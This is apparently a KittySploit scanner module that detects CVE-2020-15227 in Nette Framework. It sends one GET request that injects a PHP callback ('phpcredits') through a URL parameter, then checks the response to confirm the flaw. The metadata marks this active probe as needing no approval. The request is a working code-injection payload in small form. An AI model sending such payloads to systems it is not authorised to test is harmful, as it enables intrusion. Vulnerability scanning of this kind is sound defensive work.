#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Nette Framework versions before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nette Framework - Remote Code Execution Detection',
        'description': 'Nette Framework versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, and 3.0.6 are vulnerable to a code injection attack via specially formed parameters being passed to a URL. Nette is a PHP/Composer MVC Framework.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'nette', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/nette/application/security/advisories/GHSA-8gv3-3j7f-wg94',
            'https://github.com/Mr-xn/Penetration_Testing_POC/blob/02546075f378a9effeb6426fc17beb66b6d5c8ee/books/Nette%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(CVE-2020-15227).md',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-15227',
            'https://lists.debian.org/debian-lts-announce/2021/04/msg00003.html',
            'https://packagist.org/packages/nette/application',
        ],
        'cve': 'CVE-2020-15227',
    }

    def run(self):
        r = self.http_request(method="GET", path='/nette.micro/?callback=phpcredits', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('PHP Credits',)
        header_any = ('Nette Framework',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Nette Framework - Remote Code Execution detected",
                path='/nette.micro/?callback=phpcredits',
            )
            return True
        return False

